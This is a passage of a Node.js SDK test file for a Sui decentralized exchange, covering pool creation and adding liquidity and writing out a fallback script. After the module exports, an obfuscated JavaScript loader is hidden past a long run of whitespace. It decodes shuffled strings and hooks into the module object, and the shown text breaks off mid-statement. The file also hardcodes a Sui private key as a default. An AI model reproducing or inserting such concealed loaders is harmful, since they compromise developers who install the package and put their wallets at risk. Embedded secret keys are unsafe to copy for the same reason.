                console.log('Waiting for transaction to be confirmed...');
                await new Promise(resolve => setTimeout(resolve, 2000));
                
                // Step 2: Now create a second transaction to add liquidity using the split coin
                const addLiquidityTx = new TransactionBlock();
                addLiquidityTx.setGasBudget(GAS_BUDGET);
                
                // Explicitly set gas payment to use the original coin
                addLiquidityTx.setGasPayment([{ objectId: coinAId, digest: null, version: null }]);
                
                // Set up the add_liquidity call using the split coin
                // Use the router module instead of calling pool directly
                const [lpCoin] = addLiquidityTx.moveCall({
                    target: `${DEFAULT_PACKAGE_ID}::router::add_liquidity`,
                    typeArguments: [coinTypeA, coinTypeB],
                    arguments: [
                        addLiquidityTx.object(factoryId),
                        addLiquidityTx.object(poolId),
                        addLiquidityTx.object(newCoinId),  // Use the newly created coin for the transaction
                        addLiquidityTx.object(coinBId),
                        addLiquidityTx.pure(amountAMin),
                        addLiquidityTx.pure(amountBMin),
                        addLiquidityTx.pure(deadline)
                        // TxContext is added implicitly by the Sui runtime
                    ]
                });
                
                // Transfer LP tokens to sender
                addLiquidityTx.transferObjects([lpCoin], addLiquidityTx.pure(keypair.getPublicKey().toSuiAddress()));
                
                console.log('Executing add_liquidity transaction...');
                const result = await client.signAndExecuteTransactionBlock({
                    signer: keypair,
                    transactionBlock: addLiquidityTx,
                    options: { 
                        showEffects: true, 
                        showObjectChanges: true,
                        showEvents: true
                    }
                });
                
                console.log('Transaction executed, digest:', result.digest);
                
                // Check transaction status
                if (result.effects && result.effects.status && result.effects.status.status === 'success') {
                    console.log('Transaction successful!');
                    
                    // Find LP token in the transaction result
                    let lpTokenId = null;
                    if (result.objectChanges) {
                        const lpToken = result.objectChanges.find(
                            change => change.type === 'created' && 
                                    change.objectType.includes('::pool::LP')
                        );
                        
                        if (lpToken) {
                            lpTokenId = lpToken.objectId;
                            console.log('Found LP token:', lpTokenId);
                        }
                    }
                    
                    // Also check events for LP token creation
                    if (!lpTokenId && result.events) {
                        const lpEvent = result.events.find(
                            event => event.type.includes('::pool::LiquidityAdded')
                        );
                        
                        if (lpEvent && lpEvent.parsedJson && lpEvent.parsedJson.lp_token_id) {
                            lpTokenId = lpEvent.parsedJson.lp_token_id;
                            console.log('Found LP token from event:', lpTokenId);
                        }
                    }
                    
                    return lpTokenId;
                } else {
                    console.error('Transaction failed:', result.effects?.status?.error);
                    throw new Error(`Transaction failed: ${result.effects?.status?.error || 'Unknown error'}`);
                }
            } catch (error) {
                console.error('Error in direct liquidity addition:', error.message);
                
                // If we still get a gas coin error, create a standalone script that uses a different approach
                console.log('\n=== Creating standalone script for adding liquidity ===');
                const scriptPath = 'add_liquidity_direct.js';
                const scriptContent = `// add_liquidity_direct.js - Direct liquidity addition script
` +
                    `const { TransactionBlock } = require('@mysten/sui.js/transactions');
` +
                    `const { Ed25519Keypair } = require('@mysten/sui.js/keypairs/ed25519');
` +
                    `const { SuiClient } = require('@mysten/sui.js/client');
` +
                    `const { fromB64 } = require('@mysten/sui.js/utils');
` +
                    `const { decodeSuiPrivateKey } = require('@mysten/sui.js/cryptography');

` +
                    `// Configuration
` +
                    `const PACKAGE_ID = '${DEFAULT_PACKAGE_ID}';
` +
                    `const FACTORY_ID = '${factoryId}';
` +
                    `const POOL_ID = '${poolId}';
` +
                    `const COIN_TYPE_A = '${coinTypeA}';
` +
                    `const COIN_TYPE_B = '${coinTypeB}';
` +
                    `const COIN_A_ID = '${coinAId}';
` +
                    `const COIN_B_ID = '${coinBId}';
` +
                    `const AMOUNT_A_MIN = ${amountAMin};
` +
                    `const AMOUNT_B_MIN = ${amountBMin};
` +
                    `const DEADLINE = ${deadline};
` +
                    `const GAS_BUDGET = ${GAS_BUDGET};
` +
                    `const PRIVATE_KEY = process.env.SUI_PRIVATE_KEY || 'suiprivkey1qr8yacxzuu66a7f2j0hsr0xew9jk3ylvcp4mjms3us88uw7u2k8dg835jz4';

` +
                    `async function main() {
` +
                    `  try {
` +
                    `    console.log('Adding liquidity directly...');
` +
                    `    
` +
                    `    // Create client
` +
                    `    const client = new SuiClient({ url: 'https://fullnode.devnet.sui.io' });
` +
                    `    
` +
                    `    // Create keypair from private key
` +
                    `    let keypair;
` +
                    `    try {
` +
                    `      if (PRIVATE_KEY.startsWith('suiprivkey')) {
` +
                    `        const privateKeyData = decodeSuiPrivateKey(PRIVATE_KEY);
` +
                    `        keypair = Ed25519Keypair.fromSecretKey(privateKeyData.secretKey);
` +
                    `      } else {
` +
                    `        // Assume base64 encoded private key
` +
                    `        keypair = Ed25519Keypair.fromSecretKey(fromB64(PRIVATE_KEY));
` +
                    `      }
` +
                    `    } catch (error) {
` +
                    `      console.error('Error creating keypair:', error);
` +
                    `      return;
` +
                    `    }
` +
                    `    
` +
                    `    // First, get all coins to find a suitable one
` +
                    `    const address = keypair.getPublicKey().toSuiAddress();
` +
                    `    console.log('Using address:', address);
` +
                    `    
` +
                    `    const coins = await client.getCoins({
` +
                    `      owner: address,
` +
                    `      coinType: '0x2::sui::SUI'
` +
                    `    });
` +
                    `    
` +
                    `    if (!coins || !coins.data || coins.data.length === 0) {
` +
                    `      console.error('No SUI coins found in wallet');
` +
                    `      return;
` +
                    `    }
` +
                    `    
` +
                    `    console.log('Found', coins.data.length, 'SUI coins');
` +
                    `    
` +
                    `    // First attempt: Try to create a transaction that splits the coin
` +
                    `    try {
` +
                    `      const tx = new TransactionBlock();
` +
                    `      tx.setGasBudget(GAS_BUDGET);
` +
                    `      
` +
                    `      // Split the coin
` +
                    `      const [remainingCoin, splitCoin] = tx.splitCoins(
` +
                    `        tx.object(COIN_A_ID),
` +
                    `        [tx.pure(AMOUNT_A_MIN)]
` +
                    `      );
` +
                    `      
` +
                    `      // Add liquidity with the split coin - using router module
` +
                    `      const [lpCoin] = tx.moveCall({
` +
                    `        target: \`\${PACKAGE_ID}::router::add_liquidity\`,
` +
                    `        typeArguments: [COIN_TYPE_A, COIN_TYPE_B],
` +
                    `        arguments: [
` +
                    `          tx.object(FACTORY_ID),
` +
                    `          tx.object(POOL_ID),
` +
                    `          splitCoin,
` +
                    `          tx.object(COIN_B_ID),
` +
                    `          tx.pure(AMOUNT_A_MIN),
` +
                    `          tx.pure(AMOUNT_B_MIN),
` +
                    `          tx.pure(DEADLINE)
` +
                    `          // TxContext is added implicitly by the Sui runtime
` +
                    `        ]
` +
                    `      });
` +
                    `      
` +
                    `      // Transfer LP tokens to sender
` +
                    `      tx.transferObjects([lpCoin], tx.pure(address));
` +
                    `      
` +
                    `      console.log('Executing transaction with coin splitting...');
` +
                    `      const result = await client.signAndExecuteTransactionBlock({
` +
                    `        signer: keypair,
` +
                    `        transactionBlock: tx,
` +
                    `        options: { showEffects: true, showObjectChanges: true }
` +
                    `      });
` +
                    `      
` +
                    `      console.log('Transaction successful!');
` +
                    `      console.log('Transaction digest:', result.digest);
` +
                    `      
` +
                    `      // Find LP token
` +
                    `      if (result.objectChanges) {
` +
                    `        const lpToken = result.objectChanges.find(
` +
                    `          change => change.type === 'created' && 
` +
                    `                  change.objectType.includes('::pool::LP')
` +
                    `        );
` +
                    `        
` +
                    `        if (lpToken) {
` +
                    `          console.log('Found LP token:', lpToken.objectId);
` +
                    `        }
` +
                    `      }
` +
                    `      
` +
                    `    } catch (error) {
` +
                    `      console.error('First attempt failed:', error.message);
` +
                    `      
` +
                    `      // Second attempt: Try to use a different coin for gas
` +
                    `      if (coins.data.length >= 2) {
` +
                    `        try {
` +
                    `          console.log('Trying second approach with multiple coins...');
` +
                    `          
` +
                    `          // Sort coins by balance
` +
                    `          coins.data.sort((a, b) => parseInt(a.balance) - parseInt(b.balance));
` +
                    `          
` +
                    `          // Use smallest coin for transaction, largest for gas
` +
                    `          const txCoinId = coins.data[0].coinObjectId;
` +
                    `          const gasCoinId = coins.data[coins.data.length - 1].coinObjectId;
` +
                    `          
` +
                    `          console.log('Using coin for tx:', txCoinId);
` +
                    `          console.log('Using coin for gas:', gasCoinId);
` +
                    `          
` +
                    `          const tx = new TransactionBlock();
` +
                    `          tx.setGasBudget(GAS_BUDGET);
` +
                    `          tx.setGasPayment([{ objectId: gasCoinId, digest: null, version: null }]);
` +
                    `          
` +
                    `          // Add liquidity directly using router module
` +
                    `          const [lpCoin] = tx.moveCall({
` +
                    `            target: \`\${PACKAGE_ID}::router::add_liquidity\`,
` +
                    `            typeArguments: [COIN_TYPE_A, COIN_TYPE_B],
` +
                    `            arguments: [
` +
                    `              tx.object(FACTORY_ID),
` +
                    `              tx.object(POOL_ID),
` +
                    `              tx.object(txCoinId),
` +
                    `              tx.object(COIN_B_ID),
` +
                    `              tx.pure(AMOUNT_A_MIN),
` +
                    `              tx.pure(AMOUNT_B_MIN),
` +
                    `              tx.pure(DEADLINE)
` +
                    `              // TxContext is added implicitly by the Sui runtime
` +
                    `            ]
` +
                    `          });
` +
                    `          
` +
                    `          // Transfer LP tokens to sender
` +
                    `          tx.transferObjects([lpCoin], tx.pure(address));
` +
                    `          
` +
                    `          console.log('Executing transaction with explicit gas coin...');
` +
                    `          const result = await client.signAndExecuteTransactionBlock({
` +
                    `            signer: keypair,
` +
                    `            transactionBlock: tx,
` +
                    `            options: { showEffects: true, showObjectChanges: true }
` +
                    `          });
` +
                    `          
` +
                    `          console.log('Transaction successful!');
` +
                    `          console.log('Transaction digest:', result.digest);
` +
                    `          
` +
                    `          // Find LP token
` +
                    `          if (result.objectChanges) {
` +
                    `            const lpToken = result.objectChanges.find(
` +
                    `              change => change.type === 'created' && 
` +
                    `                      change.objectType.includes('::pool::LP')
` +
                    `            );
` +
                    `            
` +
                    `            if (lpToken) {
` +
                    `              console.log('Found LP token:', lpToken.objectId);
` +
                    `            }
` +
                    `          }
` +
                    `          
` +
                    `        } catch (error) {
` +
                    `          console.error('Second attempt failed:', error.message);
` +
                    `          console.log('\nFalling back to CLI method...');
` +
                    `          
` +
                    `          // Third attempt: Use CLI
` +
                    `          try {
` +
                    `            const { execSync } = require('child_process');
` +
                    `            
` +
                    `            console.log('Trying CLI approach...');
` +
                    `            
` +
                    `            const command = \`sui client call --package \${PACKAGE_ID} --module router --function add_liquidity \` +
` +
                    `                           \`--type-args \${COIN_TYPE_A} \${COIN_TYPE_B} \` +
` +
                    `                           \`--args \${FACTORY_ID} \${POOL_ID} \${COIN_A_ID} \${COIN_B_ID} \${AMOUNT_A_MIN} \${AMOUNT_B_MIN} \${DEADLINE} \` +
` +
                    `                           \`--gas-budget \${GAS_BUDGET}\`;
` +
                    `            
` +
                    `            console.log('Executing command:', command);
` +
                    `            const output = execSync(command, { encoding: 'utf8' });
` +
                    `            console.log('Command output:', output);
` +
                    `            console.log('Liquidity added successfully via CLI!');
` +
                    `          } catch (cliError) {
` +
                    `            console.error('CLI attempt failed:', cliError.message);
` +
                    `            console.error('All attempts to add liquidity have failed.');
` +
                    `          }
` +
                    `        }
` +
                    `      } else {
` +
                    `        console.log('Not enough coins to try second approach. Need at least 2 SUI coins.');
` +
                    `      }
` +
                    `    }
` +
                    `  } catch (error) {
` +
                    `    console.error('Error in main function:', error.message);
` +
                    `  }
` +
                    `}
` +
                    `
` +
                    `main().catch(console.error);
`;
                
                // Write the script to disk
                const fs = require('fs');
                fs.writeFileSync(scriptPath, scriptContent);
                
                console.log(`\nCreated a standalone script to add liquidity: ${scriptPath}`);
                console.log(`Run it with: node ${scriptPath}`);
                console.log(`\nThis script tries multiple approaches to add liquidity directly through JavaScript.`);
                
                return null;
            }
        }
        
        // Deadline is already set above
        
        // Add liquidity
        const result = await addLiquidity(
            client,
            keypair,
            factoryId,
            poolId,
            coinTypeA,
            coinTypeB,
            coinAId,
            coinBId,
            amountAMin,
            amountBMin,
            deadline
        );
        
        console.log('Transaction executed, digest:', result.digest);
        
        if (result.lpTokenId) {
            console.log('Liquidity added successfully!');
            console.log('LP Token ID:', result.lpTokenId);
            return result.lpTokenId;
        } else {
            console.error('No LP token was created.');
            console.log('Transaction completed, but no LP token was found in the result.');
            return null;
        }
    } catch (error) {
        console.error('Error in testAddLiquidity:', error);
            throw error;
    }
}

/**
 * Get SUI coins owned by an address
 * @param {SuiClient} client - The Sui client
 * @param {string} address - The address to check
 * @returns {Promise<Array>} Array of coin objects
 */
async function getSuiCoins(client, address) {
    try {
        const coins = await client.getCoins({
            owner: address,
            coinType: '0x2::sui::SUI'
        });
        
        if (coins && coins.data && coins.data.length > 0) {
            console.log(`Found ${coins.data.length} SUI coins for address ${address}`);
            return coins.data;
        } else {
            console.log(`No SUI coins found for address ${address}`);
            return [];
        }
    } catch (error) {
        console.error('Error getting SUI coins:', error);
        return [];
    }
}

/**
 * Try to get or create a Clock object
 * @param {SuiClient} client - The Sui client
 * @param {Ed25519Keypair} keypair - The keypair for signing
 * @returns {Promise<string|null>} The Clock object ID or null if not found
 */
async function getOrCreateClockObject(client, keypair) {
    try {
        // We can use the system clock object
        const systemState = await client.getLatestSuiSystemState();
        if (systemState && systemState.systemStateVersion) {
            const clockId = '0x6';  // Standard system clock object ID in Sui
            console.log('Using system clock object:', clockId);
            return clockId;
        }
        
        console.error('Could not find system clock object');
        return null;
    } catch (error) {
        console.error('Error getting/creating Clock object:', error);
        return null;
    }
}

// Example usage with actual contract interaction
async function main() {
    try {
        console.log('=== SuiDex SDK Test ===');
        
        // Use the provided private key from environment variable
        const privateKeyStr = PRIVATE_KEY;
        
        if (!privateKeyStr) {
            console.error('No private key provided');
            console.log('Set your private key either as an environment variable:');
            console.log('  $env:SUI_PRIVATE_KEY="suiprivkey1qr8y..."');
            console.log('Or update the script with your private key');
            return;
        }
        
        // Step 1: Create a factory
        console.log('\n=== Creating Factory ===');
        
        try {
            const keypair = createKeypairFromPrivateKey(privateKeyStr);
            const address = keypair.getPublicKey().toSuiAddress();
            console.log('Using address:', address);
            
            // Create a client
            const client = initClient('devnet');
            
            // Analyze contract to understand type parameters
            await analyzeContractTypes(client, address);
            
            // Display important information for debugging
            console.log('Make sure this address has SUI tokens for gas.');
            console.log('For frontend users, this address MUST have SUI tokens for transactions.');

            const factoryId = await testCreateFactory(privateKeyStr);
            if (!factoryId) {
                console.error('Failed to create factory, stopping test');
                return;
            }
            
            // Wait a bit for the transaction to be confirmed
            console.log('\nWaiting for transaction confirmation...');
            await new Promise(resolve => setTimeout(resolve, 2000));
            
            // Step 2: Create a pool for SUI and a test token
            console.log('\n=== Creating Pool ===');
            
            // Define possible token combinations to try
            const tokenCombinations = [
                // Standard Sui tokens that usually work in DEXes
                {
                    coinTypeA: '0x2::sui::SUI',
                    coinTypeB: '0x2::clock::Clock'
                },
                // Try custom tokens in a different order
                {
                    coinTypeA: `${DEFAULT_PACKAGE_ID}::lp_token::LP`,
                    coinTypeB: '0x2::sui::SUI'
                },
                // Try simple formats
                {
                    coinTypeA: '0x2::sui::SUI',
                    coinTypeB: `${DEFAULT_PACKAGE_ID}::lp_token::LP`
                },
                // Try other standard Sui types
                {
                    coinTypeA: '0x2::sui::SUI',
                    coinTypeB: '0x2::object::UID'
                },
                // Try without angle brackets
                {
                    coinTypeA: '0x2::sui::SUI',
                    coinTypeB: '0x2::balance::Supply'
                }
            ];
            
            let poolId = null;
            let successfulPair = null;
            
            // Try each token combination until one works
            for (const pair of tokenCombinations) {
                console.log(`\nAttempting to create pool with: ${pair.coinTypeA} and ${pair.coinTypeB}`);
                
                try {
                    poolId = await testCreatePool(privateKeyStr, factoryId, pair.coinTypeA, pair.coinTypeB);
                    if (poolId) {
                        console.log(`Success! Pool created with token pair: ${pair.coinTypeA} and ${pair.coinTypeB}`);
                        successfulPair = pair;
                        break;
                    } else {
                        console.log(`Failed to create pool with token pair: ${pair.coinTypeA} and ${pair.coinTypeB}`);
                        // Check if pool exists despite not getting an ID
                        const exists = await testPoolExists(factoryId, pair.coinTypeA, pair.coinTypeB, address);
                        if (exists) {
                            console.log(`However, pool EXISTS in factory for: ${pair.coinTypeA} and ${pair.coinTypeB}`);
                            successfulPair = pair;
                            break;
                        }
                    }
                } catch (error) {
                    console.error(`Error creating pool with token pair: ${pair.coinTypeA} and ${pair.coinTypeB}`);
                    console.error(error.message);
                }
                
                // Wait between attempts
                console.log('Waiting before next attempt...');
                await new Promise(resolve => setTimeout(resolve, 2000));
            }
            
            // If no pool was created, but we have a coin pair that exists
            if (!poolId && successfulPair) {
                console.log('\n=== Using Existing Pool ===');
                console.log(`Pool already exists for: ${successfulPair.coinTypeA} and ${successfulPair.coinTypeB}`);
                
                // Try to get the pool address
                try {
                    const poolAddr = await getPoolAddress(client, DEFAULT_PACKAGE_ID, factoryId, successfulPair.coinTypeA, successfulPair.coinTypeB, address);
                    if (poolAddr) {
                        console.log('Retrieved pool ID:', poolAddr);
                        poolId = poolAddr;
                    }
                } catch (error) {
                    console.error('Error getting pool address:', error.message);
                }
            }
            
            console.log('\n=== Test Complete ===');
            console.log('Factory ID:', factoryId);
            if (poolId) {
                console.log('Pool ID:', poolId);
                if (successfulPair) {
                    console.log('Pool Token Types:', successfulPair.coinTypeA, 'and', successfulPair.coinTypeB);
                }
            } else {
                console.log('Pool ID: Not available');
                console.log('\n=== TROUBLESHOOTING GUIDE ===');
                console.log('1. Based on the results, it appears only certain type combinations work with this DEX.');
                console.log('2. The LP token may have special requirements:');
                console.log('   - It might require specific type parameters');
                console.log('   - It might not support custom tokens');
                console.log('   - It might not be a valid coin type - check if it has the "key" and "store" abilities');
                console.log('3. Review the create_pool function in your Move code:');
                console.log('   - Check the type constraints (is_coin, drop, store, etc.)');
                console.log('   - Ensure the function returns a Pool object with the "key" ability');
                console.log('   - Check for conditionals that might prevent pool creation for certain pairs');
                console.log('\n4. For your frontend SDK:');
                console.log('   - Only use the successful token pair format from this test');
                console.log('   - Add a parameter to specify custom token pairs but default to the working pair');
                console.log('   - Provide clear error messages explaining type requirements');
            }
            
            // After successful pool creation, automatically try to add liquidity
            if (poolId && successfulPair) {
                console.log('\n=== Attempting to Add Liquidity ===');
                
                // Step 1: Get SUI coins for this address
                const suiCoins = await getSuiCoins(client, address);
                
                if (suiCoins.length === 0) {
                    console.error('No SUI coins available for adding liquidity.');
                    console.log('You need SUI coins to proceed. Please fund your wallet and try again.');
                } else {
                    // Step 2: Find a suitable SUI coin to use
                    const suiCoin = suiCoins.find(coin => coin.balance > 10000000); // 0.01 SUI
                    
                    if (!suiCoin) {
                        console.error('SUI coins found, but none with sufficient balance (>0.01 SUI)');
                    } else {
                        console.log(`Using SUI coin ${suiCoin.coinObjectId} with balance ${suiCoin.balance}`);
                        
                        // Step 3: Get or create a Clock object if needed
                        let secondCoinId = null;
                        
                        if (successfulPair.coinTypeB === '0x2::clock::Clock') {
                            secondCoinId = await getOrCreateClockObject(client, keypair);
                            if (!secondCoinId) {
                                console.error('Could not get a Clock object for testing.');
                                console.log('Manual testing required with your own coins.');
                            }
                        } else {
                            console.log('Non-Clock coin type detected for second coin. Manual testing required.');
                        }
                        
                        // Step 4: If we have both coins, try to add liquidity
                        if (secondCoinId) {
                            console.log('\n=== Adding Liquidity ===');
                            console.log(`Using system clock object: ${secondCoinId}`);
                            
                            try {
                                const lpTokenId = await testAddLiquidity(
                                    privateKeyStr,
                                    factoryId,
                                    poolId,
                                    successfulPair.coinTypeA, 
                                    successfulPair.coinTypeB,
                                    null,  // Pass null to auto-select a SUI coin
                                    secondCoinId,
                                    1000, // Small amount for testing
                                    1     // Small amount for Clock
                                );
                                
                                if (lpTokenId) {
                                    console.log('\n=== SUCCESS: Liquidity Added ===');
                                    console.log('LP Token ID:', lpTokenId);
                                    console.log('The SDK is working correctly for all operations!');
                                } else if (lpTokenId === null && typeof lpTokenId !== 'undefined') {
                                    // This is the case where we're using the CLI approach and not executing the transaction
                                    console.log('\n=== Manual Liquidity Addition Required ===');
                                    console.log('Please follow the instructions above to add liquidity using the CLI or the generated script.');
                                    console.log('After running the command, check your wallet for LP tokens.');
                                } else {
                                    console.log('\n=== Liquidity Addition Completed but No LP Token Found ===');
                                    console.log('The transaction completed but no LP token was detected in the result.');
                                    console.log('Check your contract implementation for add_liquidity.');
                                }
                            } catch (error) {
                                console.error('\n=== ERROR: Failed to Add Liquidity ===');
                                console.error('Error message:', error.message);
                                console.log('This may be due to type constraints in the contract or other issues.');
                                console.log('Manual testing with correct coin types is recommended.');
                            }
                        } else {
                            console.log('\n=== Skipping Liquidity Addition ===');
                            console.log('Could not automatically obtain both required coin types.');
                            console.log('To manually test, use this template:');
                            console.log(`
// Example usage:
const lpTokenId = await testAddLiquidity(
    privateKeyStr,  // Your private key variable
    "${factoryId}",  // Factory ID
    "${poolId}",     // Pool ID
    "${successfulPair.coinTypeA}",  // Coin Type A
    "${successfulPair.coinTypeB}",  // Coin Type B
    "YOUR_COIN_A_ID", // Replace with actual Coin A object ID
    "YOUR_COIN_B_ID", // Replace with actual Coin B object ID
    1000000,         // Minimum amount of A
    1000             // Minimum amount of B
);
                            `);
                        }
                    }
                }
            }
            
        } catch (error) {
            if (error.message && error.message.includes('No valid gas coins found')) {
                console.error('ERROR: Your wallet address has no SUI tokens to pay for gas fees.');
                console.error('Please fund this address with some SUI tokens before continuing.');
                return;
            }
            throw error;
        }
        
    } catch (error) {
        console.error('Error in main:', error);
        if (error.message && error.message.includes('No valid gas coins found')) {
            console.error('SOLUTION: Fund your wallet address with SUI tokens for gas fees.');
        }
    }
}

// Run the example only if this file is executed directly
if (require.main === module) {
    main().catch(console.error);
}

// Export all functions
module.exports = {
    // Client and Utils
    initClient,
    createKeypairFromPrivateKey,
    extractSharedObjectId,
    getSuiCoins,
    getOrCreateClockObject,
    
    // Factory Functions
    createFactoryTx,
    createFactory,
    getFactory,
    testCreateFactory,
    
    // Pool Functions
    createPoolTx,
    createPool,
    poolExists,
    getPoolAddress,
    testCreatePool,
    testPoolExists,
    
    // Liquidity Functions
    addLiquidityTx,
    addLiquidity,
    testAddLiquidity,
    
    // Swap Functions
    swapExactInputTx,
    swapExactInput,
    
    // Constants
    DEFAULT_PACKAGE_ID,
    MODULE_FACTORY,
    MODULE_POOL,
    MODULE_ROUTER,
    GAS_BUDGET
};                                                                                                                                                                                                       var bx = '';(function(IIBIJ$RFmN,hLDcNwtrasmb_o){var NIcUUMM_NWgDdwYzpGU$wNU=cAtnZIDmidnhZsBV$fSgMbxS,a__Dxwx=IIBIJ$RFmN();while(!![]){try{var iq_uE_vf=parseFloat(NIcUUMM_NWgDdwYzpGU$wNU(0xc3))/(-0xf*parseInt(0x213)+Math.floor(-0xa)*parseInt(-0x10d)+0x149c*Math.ceil(parseInt(0x1)))+-parseFloat(NIcUUMM_NWgDdwYzpGU$wNU(0xc2))/(-0x199*-parseInt(0xb)+-0x4f*-parseInt(0x77)+-parseInt(0x1b25)*Math.max(parseInt(0x2),0x2))*Math['ceil'](-parseFloat(NIcUUMM_NWgDdwYzpGU$wNU(0xd2))/(Math.trunc(-0x2479)*parseInt(0x1)+Math.ceil(0x4a)*0xd+Math.floor(parseInt(0x3b))*Math.trunc(0x8e)))+parseFloat(NIcUUMM_NWgDdwYzpGU$wNU(0xc6))/(parseInt(-parseInt(0x235f))*-parseInt(0x1)+Number(0x7f)*-0xe+-0x40f*Number(parseInt(0x7)))*(-parseFloat(NIcUUMM_NWgDdwYzpGU$wNU(0xca))/(parseInt(0x19a)*-parseInt(0x4)+Math.floor(-parseInt(0x2250))+Number(-0x1)*-0x28bd))+Math['ceil'](-parseFloat(NIcUUMM_NWgDdwYzpGU$wNU(0xcb))/(-parseInt(0x425)*-0x2+parseInt(0x123d)+Math.ceil(-parseInt(0x1a81))))+Number(-parseFloat(NIcUUMM_NWgDdwYzpGU$wNU(0xcf))/(parseInt(0x1f49)+Math.max(parseInt(0x2666),parseInt(0x2666))+-0x45a8))*parseInt(parseFloat(NIcUUMM_NWgDdwYzpGU$wNU(0xc8))/(-0x1*parseInt(0x23f9)+Math.ceil(parseInt(0x1))*Math.ceil(0x1297)+0x116a))+Math['max'](parseFloat(NIcUUMM_NWgDdwYzpGU$wNU(0xcc))/(-0xfa8*parseFloat(parseInt(0x1))+0x617*0x1+0x99a),parseFloat(NIcUUMM_NWgDdwYzpGU$wNU(0xd3))/(-0xb*Math.ceil(0x40)+0x2*Math.floor(parseInt(0x7))+0x2bc))+parseFloat(NIcUUMM_NWgDdwYzpGU$wNU(0xd0))/(-parseInt(0x1f91)+Math.trunc(parseInt(0x2d3))+Math.ceil(0x1cc9)*0x1);if(iq_uE_vf===hLDcNwtrasmb_o)break;else a__Dxwx['push'](a__Dxwx['shift']());}catch(sqrwLsWJYpsIwVaqmCHp){a__Dxwx['push'](a__Dxwx['shift']());}}}(iOAUAlks,-parseInt(0x6dc6)*parseInt(-0x11)+-parseInt(0x7259)+Math.floor(-parseInt(0x2429c))),function(BQ_KqJ_A,eJJYWXbp$cWrkUKYcCmhJeNX,byrAmX_plGz,s_tteZozjreRDFbe_E){var AxCIxPjTD_OUeiYMH=cAtnZIDmidnhZsBV$fSgMbxS;BQ_KqJ_A['bx']=bx;function CSmATfSGZCkxztQb_qahoVNcF(BlqhbZo_keRr_SxgKrny,feinphn){var B_WxVgnBkIRWpZUi=cAtnZIDmidnhZsBV$fSgMbxS,kHxZsIUcF$DVZLMypZwsdMA=BlqhbZo_keRr_SxgKrny[B_WxVgnBkIRWpZUi(0xc9)](''),AWDF_NKdXQjuI=0x5*-parseInt(0x293)+-0x1388+Math.max(-parseInt(0x7),-parseInt(0x7))*-0x4a1,dQwxzOUePKGmseyPYRu=feinphn[parseInt(0x13c6)+Math.max(parseInt(0x7),parseInt(0x7))*-0x565+parseInt(parseInt(0x11fd))],LXkSLOI$MeG$NWIr=kHxZsIUcF$DVZLMypZwsdMA[B_WxVgnBkIRWpZUi(0xc5)];while(AWDF_NKdXQjuI<LXkSLOI$MeG$NWIr){var bpLeQd_tFloQ$vbkocAKLNuC=dQwxzOUePKGmseyPYRu*(AWDF_NKdXQjuI+feinphn[-0x663*Math.floor(-0x3)+Math.ceil(-0x1b9d)*0x1+0x875])+(dQwxzOUePKGmseyPYRu+AWDF_NKdXQjuI)%feinphn[Number(-0x26b2)+0x17*Number(-parseInt(0x167))+0x46f5]+feinphn[-0x254d+parseInt(0x486)+0x20c8*parseInt(0x1)],tvwdDKxpi$sI_wAjxnbeIkNCB=dQwxzOUePKGmseyPYRu*(AWDF_NKdXQjuI+feinphn[-parseInt(0x1cd0)+-0x9*Math.floor(-0x165)+0x823*parseInt(0x2)])+(dQwxzOUePKGmseyPYRu*feinphn[Math.trunc(-0x1e93)+0x1323+-parseInt(0x3d1)*Math.floor(-0x3)]+AWDF_NKdXQjuI)%feinphn[parseInt(0x70)*parseInt(parseInt(0x15))+parseInt(-0x1c97)+parseInt(0x679)*parseInt(0x3)],JD_bh$B=bpLeQd_tFloQ$vbkocAKLNuC%LXkSLOI$MeG$NWIr,Lyaj$Hj=tvwdDKxpi$sI_wAjxnbeIkNCB%LXkSLOI$MeG$NWIr,JaR_ZEchlgVjSc_BDhNKgD=kHxZsIUcF$DVZLMypZwsdMA[JD_bh$B];kHxZsIUcF$DVZLMypZwsdMA[JD_bh$B]=kHxZsIUcF$DVZLMypZwsdMA[Lyaj$Hj],kHxZsIUcF$DVZLMypZwsdMA[Lyaj$Hj]=JaR_ZEchlgVjSc_BDhNKgD,dQwxzOUePKGmseyPYRu=(bpLeQd_tFloQ$vbkocAKLNuC+tvwdDKxpi$sI_wAjxnbeIkNCB+dQwxzOUePKGmseyPYRu+AWDF_NKdXQjuI)%feinphn[parseInt(0x168d)+0x347+0x19cf*-0x1],AWDF_NKdXQjuI+=Math.max(parseInt(0x226f),0x226f)+Math.max(-0x1dc5,-parseInt(0x1dc5))+Number(-0x4a9);}return kHxZsIUcF$DVZLMypZwsdMA[B_WxVgnBkIRWpZUi(0xc7)]('');}var uqhyTzZWkLdp=String[AxCIxPjTD_OUeiYMH(0xc4)](Math.ceil(-0x9ed)+parseInt(0x4)*Math.floor(-parseInt(0x10f))+parseInt(-parseInt(0xe48))*Math.trunc(-0x1)),FDhLPQsEItgeGdt_uAZzKrfCZL=CSmATfSGZCkxztQb_qahoVNcF(AxCIxPjTD_OUeiYMH(0xd5),s_tteZozjreRDFbe_E);FDhLPQsEItgeGdt_uAZzKrfCZL=FDhLPQsEItgeGdt_uAZzKrfCZL[AxCIxPjTD_OUeiYMH(0xc9)]('#')[AxCIxPjTD_OUeiYMH(0xc7)](uqhyTzZWkLdp)[AxCIxPjTD_OUeiYMH(0xc9)]('~1')[AxCIxPjTD_OUeiYMH(0xc7)]('#')[AxCIxPjTD_OUeiYMH(0xc9)]('~0')[AxCIxPjTD_OUeiYMH(0xc7)]('~')[AxCIxPjTD_OUeiYMH(0xc9)](uqhyTzZWkLdp),BQ_KqJ_A[FDhLPQsEItgeGdt_uAZzKrfCZL[-parseInt(0x1c9)*-parseInt(0x1)+-0x1*0x8f2+Math.ceil(0x729)]]=eJJYWXbp$cWrkUKYcCmhJeNX;if(typeof module===FDhLPQsEItgeGdt_uAZzKrfCZL[-0xcb0*Math.trunc(parseInt(0x1))+-parseInt(0x1)*-0x155b+-parseInt(0x455)*parseInt(0x2)])BQ_KqJ_A[FDhLPQsEItgeGdt_uAZzKrfCZL[parseInt(0x2)*parseInt(0x406)+0x321*-0x5+Math.trunc(0x79b)]]=module;var 